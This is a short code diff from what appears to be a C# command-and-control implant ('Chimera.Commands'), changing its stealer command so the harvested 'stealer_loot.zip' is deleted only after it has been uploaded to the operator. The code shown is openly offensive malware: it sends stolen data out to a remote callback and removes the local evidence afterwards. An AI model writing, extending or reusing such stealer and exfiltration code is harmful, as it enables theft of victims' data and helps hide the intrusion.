@@ -123,8 +123,12 @@ namespace Chimera.Commands
                 string uploadResult = Upload.Execute(
                     LootPath + " stealer_loot.zip", taskID, callbackUUID);
 
-                // Clean up zip after upload
-                try { File.Delete(LootPath); } catch { }
+                // Only clean up zip if upload succeeded (don't delete on error so local test can inspect it)
+                bool uploadOk = !uploadResult.StartsWith("[error]");
+                if (uploadOk)
+                {
+                    try { File.Delete(LootPath); } catch { }
+                }
 
                 return "[+] Stealer completed.\n" +
                        "    Exe: " + StealerExe + "\n" +
